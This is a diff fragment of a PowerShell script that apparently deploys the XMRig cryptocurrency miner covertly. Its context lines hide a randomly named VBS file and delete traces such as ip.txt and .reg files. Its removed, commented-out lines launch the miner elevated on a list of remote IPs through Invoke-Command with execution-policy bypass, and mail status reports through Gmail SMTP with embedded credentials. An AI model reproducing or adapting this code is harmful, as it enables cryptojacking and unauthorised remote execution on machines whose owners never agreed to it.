@@ -85,8 +85,6 @@ Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
 
 Start-Sleep -Seconds 30
 
-#et-ItemProperty -Path "initial_dir\\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"
-
 # Create New Directory and Change to It
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
 cd $wd
@@ -108,68 +106,6 @@ if (Test-Path -Path $newConfigPath) {
     Write-Output "New config.json file not found at the specified path."
 }
 
-# # Define Paths
-# $ipFile = "$initial_dir\ip.txt"
-# $xmrPath = "$initial_dir\start.cmd"
-# $configPath = "$initial_dir\config.json"
-
-# # Send Email with Rig Status
-# Send-MailMessage `
-#     -From $email `
-#     -To $email `
-#     -Subject "XMRig Execution Status from $env:UserName" `
-#     -Body "Xmrig Process Starting..." `
-#     -SmtpServer "smtp.gmail.com" `
-#     -Port 587 `
-#     -UseSsl `
-#     -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
-
-# # Read IP Addresses and Execute XMRig
-# $ips = Get-Content -Path $ipFile
-# foreach ($ip in $ips) {
-#     try {
-#         Write-Output "Processing IP: $ip"
-#         $command = "$xmrPath -c $configPath"
-#         Invoke-Command -ComputerName $ip -ScriptBlock {
-#             param($command)
-#             Start-Process -FilePath "PowerShell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -Verb RunAs
-#         } -ArgumentList $command
-
-#         Write-Output "XMRig started on IP: $ip"
-#         Send-MailMessage `
-#             -From $email `
-#             -To $email `
-#             -Subject "XMRig Execution Success" `
-#             -Body "XMRig has successfully started on IP: $ip" `
-#             -SmtpServer "smtp.gmail.com" `
-#             -Port 587 `
-#             -UseSsl `
-#             -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
-#     } catch {
-#         Write-Output "Error processing IP: $ip"
-#         Send-MailMessage `
-#             -From $email `
-#             -To $email `
-#             -Subject "XMRig Execution Failure" `
-#             -Body "Failed to start XMRig on IP: $ip" `
-#             -SmtpServer "smtp.gmail.com" `
-#             -Port 587 `
-#             -UseSsl `
-#             -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
-#     }
-# }
-
-# # Final Email Notification
-# Write-Output "Script execution completed"
-# Send-MailMessage `
-#     -From $email `
-#     -To $email `
-#     -Subject "Script Execution Completed" `
-#     -Body "The script has finished executing. Please check the status of each IP address." `
-#     -SmtpServer "smtp.gmail.com" `
-#     -Port 587 `
-#     -UseSsl `
-#     -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
 
 # Clean Up
 Remove-Item -Path "$initial_dir\ip.txt"
@@ -190,16 +126,7 @@ Remove-Item -Path "config.json"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
-#mkdir $initial_dir\esSDyVlwHITj
-
 Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"
-
-#attrib +h "initial_dir\esSDyVlwHITj"
-
-#Move-Item -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Destination $initial_dir\esSDyVlwHITj
-
-#Move-Item -Path "$initial_dir\nEQlCzTBpDrO.bat" -Destination $initial_dir\esSDyVlwHITj
-
 
 cd $initial_dir
 
